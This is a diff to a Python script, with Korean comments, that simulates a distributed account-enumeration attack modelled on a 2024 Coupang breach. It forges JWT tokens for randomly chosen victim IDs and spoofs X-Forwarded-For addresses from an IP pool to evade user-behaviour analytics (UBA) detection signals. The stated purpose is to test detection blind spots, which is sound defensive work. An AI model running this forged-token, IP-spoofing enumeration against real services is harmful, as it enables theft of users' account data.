@@ -1,24 +1,15 @@
 """
-S5b — IP Pool + sub random (완전 분산 botnet, 쿠팡 패턴 모방).
-
-쿠팡 해킹 사고 (2024) 분포:
-    2,300 IP × 3,367 계정 = 약 1.4억 건 조회
-    → 한 IP가 여러 계정을 반복 조회, 한 계정이 여러 IP에서 조회
-    → 매 요청마다 victim/IP 모두 랜덤 추출되는 분포
-
-본 시뮬은 풀 크기 비율(IP : 계정 ≈ 2300 : 3367 ≈ 0.68 : 1)만 비례 축소해
-재현하고, **총 호출량은 S4/S5와 동일하게 풀 크기(498건)로 통일**한다.
-계정당 호출 수가 평균 1건 수준으로 줄지만, "매 요청 victim/IP 모두 random"
-이라는 분포 자체는 그대로 보존되므로 UBA 입장에서 회피 메커니즘은 동일.
+S5b — IP Pool 분산 + sub random 선택 (분산 enumeration).
 
 행위:
-- 매 요청마다 victim/IP 모두 random
-- XFF 위조로 IP 분산
+- [START, END) 범위에서 VICTIM_COUNT명을 랜덤 비복원 추출 → 각 1회 공격
+- sub는 랜덤 순서 (글로벌 단조 패턴 없음)
+- 매 요청 IP random (XFF 위조로 IP 분산)
 - 매 호출 새 jti (key 탈취 가정, forge_token)
 
 회피하는 신호:
-- 단일 IP × 다수 sub (5분 윈도우 다양성) — 풀 분산으로 회피
-- **글로벌 sub 단조 패턴** — sub random으로 회피
+- 단일 IP × 다수 sub (5분 윈도우 다양성) — IP 풀 분산으로 회피
+- **글로벌 sub 단조 패턴** — sub 랜덤 선택으로 회피
 - jti 재사용 — 매번 새 jti
 
 회피하지 못하는 신호:
@@ -30,12 +21,15 @@ S5b — IP Pool + sub random (완전 분산 botnet, 쿠팡 패턴 모방).
     FirstSeen 같은 보완 factor 없으면 탐지 사각지대. 본 시뮬은 그 사각지대를
     재현해 보완 factor 필요성을 데이터로 보여준다.
 
-S4 / S5와의 차이:
-    S4  — 단일 IP, sub 순차 1회 순회 (498건)
-    S5  — IP 분산,  sub 순차 1회 순회 (498건)
-    S5b — IP 분산,  sub random      (498건)  ← 이 파일
+S4 / S5와의 차이 (셋 다 각 사용자 정확히 1회 방문, 총 VICTIM_COUNT건):
+    S4  — 단일 IP, sub 순차
+    S5  — IP 분산,  sub 순차
+    S5b — IP 분산,  sub random 선택   ← 이 파일
 
-세 시나리오 모두 총 호출량과 호출 방식이 동일. 다른 건 IP / sub 선택 전략뿐.
+세 시나리오 모두 총 호출량·호출 방식이 동일. 다른 건 IP / sub 선택 전략뿐.
+
+NOTE: 한 계정을 여러 번 조회하는 분포(쿠팡식 복원추출 — 2,300 IP × 3,367 계정)가
+      필요하면 별도 시나리오로 추가할 것. 본 시나리오는 각 사용자 1회로 통일한다.
 """
 import os
 import sys
@@ -50,7 +44,7 @@ _ROOT = Path(__file__).resolve().parent.parent
 sys.path.insert(0, str(_ROOT))
 
 from lib.token_forge import forge_token
-from lib.target_pool import get_sequential_pool
+from lib.target_pool import get_shuffled_pool
 from lib.ip_pool import get_distributed_ips, COUPANG_IP_TO_ACCOUNT_RATIO
 from lib.http_client import get_session, call_api
 
@@ -71,7 +65,8 @@ def run_s5b(
     """
     session = get_session()
 
-    victims = get_sequential_pool()
+    # 범위에서 VICTIM_COUNT명 랜덤 비복원 추출 (seed=None → 매 실행 다른 표본)
+    victims = get_shuffled_pool(seed=None)
     victim_count = len(victims)
 
     # IP 풀: 쿠팡 비율 기본 (계정 × 0.683, lib/ip_pool.COUPANG_IP_TO_ACCOUNT_RATIO)
@@ -80,7 +75,7 @@ def run_s5b(
         ip_pool_size = max(2, round(victim_count * COUPANG_IP_TO_ACCOUNT_RATIO))
 
     ip_pool = get_distributed_ips(count=ip_pool_size)
-    total_requests = victim_count  # S4/S5와 동일 호출량 (풀 크기만큼)
+    total_requests = victim_count  # 각 사용자 1회 = S4/S5와 동일 호출량
 
     if duration_minutes is not None:
         interval = (duration_minutes * 60) / max(1, total_requests)
@@ -90,10 +85,10 @@ def run_s5b(
 
     rng = random.Random()
 
-    print(f"[S5b] === IP Pool 분산 + sub random (쿠팡 분포) ===")
-    print(f"[S5b]   victim pool   : {victim_count}명 ({victims[0]}~{victims[-1]})")
+    print(f"[S5b] === IP Pool 분산 + sub random 선택 (각 사용자 1회) ===")
+    print(f"[S5b]   victim pool   : {victim_count}명 (랜덤 비복원 추출)")
     print(f"[S5b]   IP pool       : {ip_pool_size}개 (random per request)")
-    print(f"[S5b]   total requests: {total_requests:,}건 (sub random)")
+    print(f"[S5b]   total requests: {total_requests:,}건 (각 사용자 1회)")
     print(f"[S5b]   interval      : {interval:.3f}s  → eta {eta_min:.1f}min")
     print(f"[S5b]   IP 샘플       : {ip_pool[:5]} ...")
 
@@ -102,9 +97,8 @@ def run_s5b(
     success_count = 0
 
     try:
-        for _ in range(total_requests):
-            # 매 요청마다 victim/IP 모두 랜덤 (쿠팡 분포)
-            victim_id = rng.choice(victims)
+        for victim_id in victims:
+            # victim은 사전 추출된 표본을 1회씩, IP만 매 요청 랜덤
             src_ip = rng.choice(ip_pool)
             token = forge_token(victim_id)
 
@@ -134,14 +128,12 @@ def run_s5b(
     except KeyboardInterrupt:
         print(f"\n[S5b] 사용자 중단")
 
-    avg_per_victim = request_count / max(1, victim_count)
     avg_per_ip = request_count / max(1, ip_pool_size)
     print(
         f"[S5b] 종료 — 총 {request_count:,} 요청, {success_count:,} 성공"
     )
     print(
-        f"[S5b] 분포 — 계정당 평균 {avg_per_victim:.2f}건, "
-        f"IP당 평균 {avg_per_ip:.2f}건"
+        f"[S5b] 분포 — 계정당 1건(각 사용자 1회), IP당 평균 {avg_per_ip:.1f}건"
     )
 
 
